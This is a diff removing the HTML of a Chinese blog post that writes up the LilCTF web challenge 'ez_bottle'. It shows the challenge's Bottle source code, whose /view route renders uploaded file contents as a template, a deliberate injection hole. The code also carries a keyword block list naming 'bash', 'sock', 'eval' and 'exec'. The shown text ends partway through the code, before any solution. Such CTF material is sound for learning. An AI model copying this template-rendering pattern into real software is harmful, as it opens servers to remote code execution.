@@ -1,786 +1,169 @@
-<!DOCTYPE html>
-<html lang="zh-cn" dir="ltr">
-    <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="LilCTF复现\r时隔好久再一次打CTF（放假之后太懒狗成区了），还是一如既往地做不出题啊QAQ\nWEB\rez_bottle\r附件源码：\nfrom bottle import route, run, template, post, request, static_file, error import os import zipfile import hashlib import time # hint: flag in /flag , have a try UPLOAD_DIR = os.path.join(os.path.dirname(__file__), &#39;uploads&#39;) os.makedirs(UPLOAD_DIR, exist_ok=True) STATIC_DIR = os.path.join(os.path.dirname(__file__), &#39;static&#39;) MAX_FILE_SIZE = 1 * 1024 * 1024 BLACK_DICT = [&#34;{&#34;, &#34;}&#34;, &#34;os&#34;, &#34;eval&#34;, &#34;exec&#34;, &#34;sock&#34;, &#34;&lt;&#34;, &#34;&gt;&#34;, &#34;bul&#34;, &#34;class&#34;, &#34;?&#34;, &#34;:&#34;, &#34;bash&#34;, &#34;_&#34;, &#34;globals&#34;, &#34;get&#34;, &#34;open&#34;] def contains_blacklist(content): return any(black in content for black in BLACK_DICT) def is_symlink(zipinfo): return (zipinfo.external_attr &gt;&gt; 16) &amp; 0o170000 == 0o120000 def is_safe_path(base_dir, target_path): return os.path.realpath(target_path).startswith(os.path.realpath(base_dir)) @route(&#39;/&#39;) def index(): return static_file(&#39;index.html&#39;, root=STATIC_DIR) @route(&#39;/static/&lt;filename&gt;&#39;) def server_static(filename): return static_file(filename, root=STATIC_DIR) @route(&#39;/upload&#39;) def upload_page(): return static_file(&#39;upload.html&#39;, root=STATIC_DIR) @post(&#39;/upload&#39;) def upload(): zip_file = request.files.get(&#39;file&#39;) if not zip_file or not zip_file.filename.endswith(&#39;.zip&#39;): return &#39;Invalid file. Please upload a ZIP file.&#39; if len(zip_file.file.read()) &gt; MAX_FILE_SIZE: return &#39;File size exceeds 1MB. Please upload a smaller ZIP file.&#39; zip_file.file.seek(0) current_time = str(time.time()) unique_string = zip_file.filename + current_time md5_hash = hashlib.md5(unique_string.encode()).hexdigest() extract_dir = os.path.join(UPLOAD_DIR, md5_hash) os.makedirs(extract_dir) zip_path = os.path.join(extract_dir, &#39;upload.zip&#39;) zip_file.save(zip_path) try: with zipfile.ZipFile(zip_path, &#39;r&#39;) as z: for file_info in z.infolist(): if is_symlink(file_info): return &#39;Symbolic links are not allowed.&#39; real_dest_path = os.path.realpath(os.path.join(extract_dir, file_info.filename)) if not is_safe_path(extract_dir, real_dest_path): return &#39;Path traversal detected.&#39; z.extractall(extract_dir) except zipfile.BadZipFile: return &#39;Invalid ZIP file.&#39; files = os.listdir(extract_dir) files.remove(&#39;upload.zip&#39;) return template(&#34;文件列表: {{files}}\\n访问: /view/{{md5}}/{{first_file}}&#34;, files=&#34;, &#34;.join(files), md5=md5_hash, first_file=files[0] if files else &#34;nofile&#34;) @route(&#39;/view/&lt;md5&gt;/&lt;filename&gt;&#39;) def view_file(md5, filename): file_path = os.path.join(UPLOAD_DIR, md5, filename) if not os.path.exists(file_path): return &#34;File not found.&#34; with open(file_path, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f: content = f.read() if contains_blacklist(content): return &#34;you are hacker!!!nonono!!!&#34; try: return template(content) except Exception as e: return f&#34;Error rendering template: {str(e)}&#34; @error(404) def error404(error): return &#34;bbbbbboooottle&#34; @error(403) def error403(error): return &#34;Forbidden: You don&#39;t have permission to access this resource.&#34; if __name__ == &#39;__main__&#39;: run(host=&#39;0.0.0.0&#39;, port=5000, debug=False) 题目提示是bottle,想起来第一次接触bottle似乎是它的反序列化漏洞，先看看源码，以前打CTF读源码太少，都是喂给AI去读，导致没看出来哪有漏洞（悲）\n">
-<title>LilCTF复现</title>
-
-<link rel='canonical' href='https://Oight.github.io/p/lilctf%E5%A4%8D%E7%8E%B0/'>
-
-<link rel="stylesheet" href="/scss/style.min.cfe2632a91c7cb600e0badeaecd0da79bddaa315643726e117b52f62c13fe88c.css"><meta property='og:title' content="LilCTF复现">
-<meta property='og:description' content="LilCTF复现\r时隔好久再一次打CTF（放假之后太懒狗成区了），还是一如既往地做不出题啊QAQ\nWEB\rez_bottle\r附件源码：\nfrom bottle import route, run, template, post, request, static_file, error import os import zipfile import hashlib import time # hint: flag in /flag , have a try UPLOAD_DIR = os.path.join(os.path.dirname(__file__), &#39;uploads&#39;) os.makedirs(UPLOAD_DIR, exist_ok=True) STATIC_DIR = os.path.join(os.path.dirname(__file__), &#39;static&#39;) MAX_FILE_SIZE = 1 * 1024 * 1024 BLACK_DICT = [&#34;{&#34;, &#34;}&#34;, &#34;os&#34;, &#34;eval&#34;, &#34;exec&#34;, &#34;sock&#34;, &#34;&lt;&#34;, &#34;&gt;&#34;, &#34;bul&#34;, &#34;class&#34;, &#34;?&#34;, &#34;:&#34;, &#34;bash&#34;, &#34;_&#34;, &#34;globals&#34;, &#34;get&#34;, &#34;open&#34;] def contains_blacklist(content): return any(black in content for black in BLACK_DICT) def is_symlink(zipinfo): return (zipinfo.external_attr &gt;&gt; 16) &amp; 0o170000 == 0o120000 def is_safe_path(base_dir, target_path): return os.path.realpath(target_path).startswith(os.path.realpath(base_dir)) @route(&#39;/&#39;) def index(): return static_file(&#39;index.html&#39;, root=STATIC_DIR) @route(&#39;/static/&lt;filename&gt;&#39;) def server_static(filename): return static_file(filename, root=STATIC_DIR) @route(&#39;/upload&#39;) def upload_page(): return static_file(&#39;upload.html&#39;, root=STATIC_DIR) @post(&#39;/upload&#39;) def upload(): zip_file = request.files.get(&#39;file&#39;) if not zip_file or not zip_file.filename.endswith(&#39;.zip&#39;): return &#39;Invalid file. Please upload a ZIP file.&#39; if len(zip_file.file.read()) &gt; MAX_FILE_SIZE: return &#39;File size exceeds 1MB. Please upload a smaller ZIP file.&#39; zip_file.file.seek(0) current_time = str(time.time()) unique_string = zip_file.filename + current_time md5_hash = hashlib.md5(unique_string.encode()).hexdigest() extract_dir = os.path.join(UPLOAD_DIR, md5_hash) os.makedirs(extract_dir) zip_path = os.path.join(extract_dir, &#39;upload.zip&#39;) zip_file.save(zip_path) try: with zipfile.ZipFile(zip_path, &#39;r&#39;) as z: for file_info in z.infolist(): if is_symlink(file_info): return &#39;Symbolic links are not allowed.&#39; real_dest_path = os.path.realpath(os.path.join(extract_dir, file_info.filename)) if not is_safe_path(extract_dir, real_dest_path): return &#39;Path traversal detected.&#39; z.extractall(extract_dir) except zipfile.BadZipFile: return &#39;Invalid ZIP file.&#39; files = os.listdir(extract_dir) files.remove(&#39;upload.zip&#39;) return template(&#34;文件列表: {{files}}\\n访问: /view/{{md5}}/{{first_file}}&#34;, files=&#34;, &#34;.join(files), md5=md5_hash, first_file=files[0] if files else &#34;nofile&#34;) @route(&#39;/view/&lt;md5&gt;/&lt;filename&gt;&#39;) def view_file(md5, filename): file_path = os.path.join(UPLOAD_DIR, md5, filename) if not os.path.exists(file_path): return &#34;File not found.&#34; with open(file_path, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f: content = f.read() if contains_blacklist(content): return &#34;you are hacker!!!nonono!!!&#34; try: return template(content) except Exception as e: return f&#34;Error rendering template: {str(e)}&#34; @error(404) def error404(error): return &#34;bbbbbboooottle&#34; @error(403) def error403(error): return &#34;Forbidden: You don&#39;t have permission to access this resource.&#34; if __name__ == &#39;__main__&#39;: run(host=&#39;0.0.0.0&#39;, port=5000, debug=False) 题目提示是bottle,想起来第一次接触bottle似乎是它的反序列化漏洞，先看看源码，以前打CTF读源码太少，都是喂给AI去读，导致没看出来哪有漏洞（悲）\n">
-<meta property='og:url' content='https://Oight.github.io/p/lilctf%E5%A4%8D%E7%8E%B0/'>
-<meta property='og:site_name' content='Oight'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-09-01T10:31:09&#43;08:00'/><meta property='article:modified_time' content='2025-09-01T10:31:09&#43;08:00'/>
-<meta name="twitter:title" content="LilCTF复现">
-<meta name="twitter:description" content="LilCTF复现\r时隔好久再一次打CTF（放假之后太懒狗成区了），还是一如既往地做不出题啊QAQ\nWEB\rez_bottle\r附件源码：\nfrom bottle import route, run, template, post, request, static_file, error import os import zipfile import hashlib import time # hint: flag in /flag , have a try UPLOAD_DIR = os.path.join(os.path.dirname(__file__), &#39;uploads&#39;) os.makedirs(UPLOAD_DIR, exist_ok=True) STATIC_DIR = os.path.join(os.path.dirname(__file__), &#39;static&#39;) MAX_FILE_SIZE = 1 * 1024 * 1024 BLACK_DICT = [&#34;{&#34;, &#34;}&#34;, &#34;os&#34;, &#34;eval&#34;, &#34;exec&#34;, &#34;sock&#34;, &#34;&lt;&#34;, &#34;&gt;&#34;, &#34;bul&#34;, &#34;class&#34;, &#34;?&#34;, &#34;:&#34;, &#34;bash&#34;, &#34;_&#34;, &#34;globals&#34;, &#34;get&#34;, &#34;open&#34;] def contains_blacklist(content): return any(black in content for black in BLACK_DICT) def is_symlink(zipinfo): return (zipinfo.external_attr &gt;&gt; 16) &amp; 0o170000 == 0o120000 def is_safe_path(base_dir, target_path): return os.path.realpath(target_path).startswith(os.path.realpath(base_dir)) @route(&#39;/&#39;) def index(): return static_file(&#39;index.html&#39;, root=STATIC_DIR) @route(&#39;/static/&lt;filename&gt;&#39;) def server_static(filename): return static_file(filename, root=STATIC_DIR) @route(&#39;/upload&#39;) def upload_page(): return static_file(&#39;upload.html&#39;, root=STATIC_DIR) @post(&#39;/upload&#39;) def upload(): zip_file = request.files.get(&#39;file&#39;) if not zip_file or not zip_file.filename.endswith(&#39;.zip&#39;): return &#39;Invalid file. Please upload a ZIP file.&#39; if len(zip_file.file.read()) &gt; MAX_FILE_SIZE: return &#39;File size exceeds 1MB. Please upload a smaller ZIP file.&#39; zip_file.file.seek(0) current_time = str(time.time()) unique_string = zip_file.filename + current_time md5_hash = hashlib.md5(unique_string.encode()).hexdigest() extract_dir = os.path.join(UPLOAD_DIR, md5_hash) os.makedirs(extract_dir) zip_path = os.path.join(extract_dir, &#39;upload.zip&#39;) zip_file.save(zip_path) try: with zipfile.ZipFile(zip_path, &#39;r&#39;) as z: for file_info in z.infolist(): if is_symlink(file_info): return &#39;Symbolic links are not allowed.&#39; real_dest_path = os.path.realpath(os.path.join(extract_dir, file_info.filename)) if not is_safe_path(extract_dir, real_dest_path): return &#39;Path traversal detected.&#39; z.extractall(extract_dir) except zipfile.BadZipFile: return &#39;Invalid ZIP file.&#39; files = os.listdir(extract_dir) files.remove(&#39;upload.zip&#39;) return template(&#34;文件列表: {{files}}\\n访问: /view/{{md5}}/{{first_file}}&#34;, files=&#34;, &#34;.join(files), md5=md5_hash, first_file=files[0] if files else &#34;nofile&#34;) @route(&#39;/view/&lt;md5&gt;/&lt;filename&gt;&#39;) def view_file(md5, filename): file_path = os.path.join(UPLOAD_DIR, md5, filename) if not os.path.exists(file_path): return &#34;File not found.&#34; with open(file_path, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f: content = f.read() if contains_blacklist(content): return &#34;you are hacker!!!nonono!!!&#34; try: return template(content) except Exception as e: return f&#34;Error rendering template: {str(e)}&#34; @error(404) def error404(error): return &#34;bbbbbboooottle&#34; @error(403) def error403(error): return &#34;Forbidden: You don&#39;t have permission to access this resource.&#34; if __name__ == &#39;__main__&#39;: run(host=&#39;0.0.0.0&#39;, port=5000, debug=False) 题目提示是bottle,想起来第一次接触bottle似乎是它的反序列化漏洞，先看看源码，以前打CTF读源码太少，都是喂给AI去读，导致没看出来哪有漏洞（悲）\n">
-    <link rel="shortcut icon" href="/favicon.ico" />
-
-    </head>
-    <body class="
-    article-page
-    ">
-    <script>
-        (function() {
-            const colorSchemeKey = 'StackColorScheme';
-            if(!localStorage.getItem(colorSchemeKey)){
-                localStorage.setItem(colorSchemeKey, "auto");
-            }
-        })();
-    </script><script>
-    (function() {
-        const colorSchemeKey = 'StackColorScheme';
-        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
-        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
-
-        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
-            
-
-            document.documentElement.dataset.scheme = 'dark';
-        } else {
-            document.documentElement.dataset.scheme = 'light';
-        }
-    })();
-</script>
-<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
-    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
-        <span class="hamburger-box">
-            <span class="hamburger-inner"></span>
-        </span>
-    </button>
-
-    <header>
-        
-            
-            <figure class="site-avatar">
-                <a href="/">
-                
-                    
-                    
-                    
-                        
-                        <img src="/img/avatar_hu_37edead8cd3c258e.jpg" width="300"
-                            height="300" class="site-logo" loading="lazy" alt="Avatar">
-                    
-                
-                </a>
-                
-                    <span class="emoji">🐧</span>
-                
-            </figure>
-            
-        
-        
-        <div class="site-meta">
-            <h1 class="site-name"><a href="/">Oight</a></h1>
-            <h2 class="site-description">Talk is cheap. Show me the code.</h2>
-        </div>
-    </header><ol class="menu-social">
-            
-                <li>
-                    <a 
-                        href='https://space.bilibili.com/696224138'
-                        target="_blank"
-                        title="bilibili"
-                        rel="me"
-                    >
-                        
-                        
-                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
-                        
-                    </a>
-                </li>
-            
-                <li>
-                    <a 
-                        href='https://github.com/Oight'
-                        target="_blank"
-                        title="GitHub"
-                        rel="me"
-                    >
-                        
-                        
-                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
-  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
-</svg>
-
-
-
-                        
-                    </a>
-                </li>
-            
-        </ol><ol class="menu" id="main-menu">
-        
-        
-        
-        <li >
-            <a href='/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <polyline points="5 12 3 12 12 3 21 12 19 12" />
-  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
-  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
-</svg>
-
-
-
-                
-                <span>主页</span>
-            </a>
-        </li>
-        
-        
-        <li >
-            <a href='/%E5%85%B3%E4%BA%8E/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="7" r="4" />
-  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
-</svg>
-
-
-
-                
-                <span>关于</span>
-            </a>
-        </li>
-        
-        
-        <li >
-            <a href='/archives/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <rect x="3" y="4" width="18" height="4" rx="2" />
-  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
-  <line x1="10" y1="12" x2="14" y2="12" />
-</svg>
-
-
-
-                
-                <span>Archives</span>
-            </a>
-        </li>
-        
-        
-        <li >
-            <a href='/search/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="10" cy="10" r="7" />
-  <line x1="21" y1="21" x2="15" y2="15" />
-</svg>
-
-
-
-                
-                <span>Search</span>
-            </a>
-        </li>
-        
-        
-        <li >
-            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
-  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
-</svg>
-
-
-
-                
-                <span>友情链接</span>
-            </a>
-        </li>
-        
-        <li class="menu-bottom-section">
-            <ol class="menu">
-
-                
-                    <li id="dark-mode-toggle">
-                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="8" cy="12" r="2" />
-  <rect x="2" y="6" width="20" height="12" rx="6" />
-</svg>
-
-
-
-                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="16" cy="12" r="2" />
-  <rect x="2" y="6" width="20" height="12" rx="6" />
-</svg>
-
-
-
-                        <span>暗色模式</span>
-                    </li>
-                
-            </ol>
-        </li>
-    </ol>
-</aside>
-
-    <aside class="sidebar right-sidebar sticky">
-        
-            
-                
-    <section class="widget archives">
-        <div class="widget-icon">
-            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <line x1="5" y1="9" x2="19" y2="9" />
-  <line x1="5" y1="15" x2="19" y2="15" />
-  <line x1="11" y1="4" x2="7" y2="20" />
-  <line x1="17" y1="4" x2="13" y2="20" />
-</svg>
-
-
-
-        </div>
-        <h2 class="widget-title section-title">目录</h2>
-        
-        <div class="widget--toc">
-            <nav id="TableOfContents">
-  <ol>
-    <li><a href="#web">WEB</a>
-      <ol>
-        <li><a href="#ez_bottle">ez_bottle</a></li>
-      </ol>
-    </li>
-  </ol>
-</nav>
-        </div>
-    </section>
-
-            
-        
-    </aside>
-
-
-            <main class="main full-width">
-    <article class="main-article">
-    <header class="article-header">
-
-    <div class="article-details">
-    
-    <header class="article-category">
-        
-            <a href="/categories/%E5%A4%8D%E7%8E%B0/" >
-                复现
-            </a>
-        
-    </header>
-    
-
-    <div class="article-title-wrapper">
-        <h2 class="article-title">
-            <a href="/p/lilctf%E5%A4%8D%E7%8E%B0/">LilCTF复现</a>
-        </h2>
-    
-        
-    </div>
-
-    
-    
-    
-    
-    <footer class="article-time">
-        
-            <div>
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
-  <circle cx="18" cy="18" r="4" />
-  <path d="M15 3v4" />
-  <path d="M7 3v4" />
-  <path d="M3 11h16" />
-  <path d="M18 16.496v1.504l1 1" />
-</svg>
-                <time class="article-time--published">2025-09-01</time>
-            </div>
-        
-
-        
-            <div>
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="12" r="9" />
-  <polyline points="12 7 12 12 15 15" />
-</svg>
-
-
-
-                <time class="article-time--reading">
-                    阅读时长: 2 分钟
-                </time>
-            </div>
-        
-    </footer>
-    
-
-    
-</div>
-
-</header>
-
-    <section class="article-content">
-    
-    
-    <h1 id="lilctf复现">LilCTF复现
-</h1><p>时隔好久再一次打CTF（放假之后太懒狗成区了），还是一如既往地做不出题啊QAQ</p>
-<h2 id="web">WEB
-</h2><h3 id="ez_bottle">ez_bottle
-</h3><p>附件源码：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">bottle</span> <span class="kn">import</span> <span class="n">route</span><span class="p">,</span> <span class="n">run</span><span class="p">,</span> <span class="n">template</span><span class="p">,</span> <span class="n">post</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">static_file</span><span class="p">,</span> <span class="n">error</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">zipfile</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
-</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># hint: flag in /flag , have a try</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">UPLOAD_DIR</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="vm">__file__</span><span class="p">),</span> <span class="s1">&#39;uploads&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">UPLOAD_DIR</span><span class="p">,</span> <span class="n">exist_ok</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">STATIC_DIR</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="vm">__file__</span><span class="p">),</span> <span class="s1">&#39;static&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">MAX_FILE_SIZE</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">BLACK_DICT</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;{&#34;</span><span class="p">,</span> <span class="s2">&#34;}&#34;</span><span class="p">,</span> <span class="s2">&#34;os&#34;</span><span class="p">,</span> <span class="s2">&#34;eval&#34;</span><span class="p">,</span> <span class="s2">&#34;exec&#34;</span><span class="p">,</span> <span class="s2">&#34;sock&#34;</span><span class="p">,</span> <span class="s2">&#34;&lt;&#34;</span><span class="p">,</span> <span class="s2">&#34;&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;bul&#34;</span><span class="p">,</span> <span class="s2">&#34;class&#34;</span><span class="p">,</span> <span class="s2">&#34;?&#34;</span><span class="p">,</span> <span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;bash&#34;</span><span class="p">,</span> <span class="s2">&#34;_&#34;</span><span class="p">,</span> <span class="s2">&#34;globals&#34;</span><span class="p">,</span>
-</span></span><span class="line"><span class="cl">              <span class="s2">&#34;get&#34;</span><span class="p">,</span> <span class="s2">&#34;open&#34;</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">contains_blacklist</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">any</span><span class="p">(</span><span class="n">black</span> <span class="ow">in</span> <span class="n">content</span> <span class="k">for</span> <span class="n">black</span> <span class="ow">in</span> <span class="n">BLACK_DICT</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">is_symlink</span><span class="p">(</span><span class="n">zipinfo</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">zipinfo</span><span class="o">.</span><span class="n">external_attr</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mo">0o170000</span> <span class="o">==</span> <span class="mo">0o120000</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">is_safe_path</span><span class="p">(</span><span class="n">base_dir</span><span class="p">,</span> <span class="n">target_path</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">realpath</span><span class="p">(</span><span class="n">target_path</span><span class="p">)</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">realpath</span><span class="p">(</span><span class="n">base_dir</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nd">@route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">static_file</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="n">root</span><span class="o">=</span><span class="n">STATIC_DIR</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nd">@route</span><span class="p">(</span><span class="s1">&#39;/static/&lt;filename&gt;&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">server_static</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">static_file</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">root</span><span class="o">=</span><span class="n">STATIC_DIR</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nd">@route</span><span class="p">(</span><span class="s1">&#39;/upload&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">upload_page</span><span class="p">():</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">static_file</span><span class="p">(</span><span class="s1">&#39;upload.html&#39;</span><span class="p">,</span> <span class="n">root</span><span class="o">=</span><span class="n">STATIC_DIR</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nd">@post</span><span class="p">(</span><span class="s1">&#39;/upload&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">upload</span><span class="p">():</span>
-</span></span><span class="line"><span class="cl">    <span class="n">zip_file</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;file&#39;</span><span class="p">)</span>
